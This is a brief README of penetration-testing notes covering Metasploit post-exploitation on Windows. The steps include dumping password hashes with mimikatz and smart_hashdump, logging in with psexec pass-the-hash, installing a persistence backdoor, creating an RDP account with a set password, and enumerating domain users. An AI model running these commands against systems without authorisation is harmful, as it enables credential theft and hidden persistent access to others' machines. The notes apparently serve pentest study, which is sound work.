# pen-leviathan
pentesting notes

## Priv Escalation
- If we grab hashes for a system, we can use `mimikatz` to grab them from memory. This needs to be done in a 64 bit process so that meterpreter can load the module without problem.
- Run `sysinfo` and check Meterpreter value. (x86/win32 aint gonna cut it)
- To find a process to migrate to, run `ps -A x86_64 -s` when you are a `system`. This will display available compatible processes to migrate to.

## Grab hashes
- `run post/windows/gather/smart_hashdump`
- Now you can run `creds` or `loot` in the msf console to see the data as well.
- use `exploit/windows/smb/psexec`
- set usersname and then the password hash

 ## Backdoor Installation
 - For windows systems, once you have a meterpreter session, `run persistence`
 - `run getgui -e -u atk_user -p atk_password`
 - RDP Service is now started and user 'atk_user' with password 'atk_password' can now rdp into the machine.

## Pillaging
Commands inside of meterpreter for pillaging data
- sysinfo
-- if server, for example, we would know to search and see what type of services are running
- getuid
Meterpreter has a good set of gather utilities under:
- run post/windows/gather OR
- run post/linux/gather
These can also be used outsie of the meterpreter session. You just need to use the `use` command, configure its options with `set` and then execute the module with `run`
### Windows
- run post/windows/gather/enum_domains
If the machine is part of a domain, we can enumerate accounts and other information in the default active domain
- run post/windows/gather/enum_ad_users
- In a shell, run `net localgroup` to list groups and `net localgroup [GROUPNAME]` to list members of a specific group
### Linux
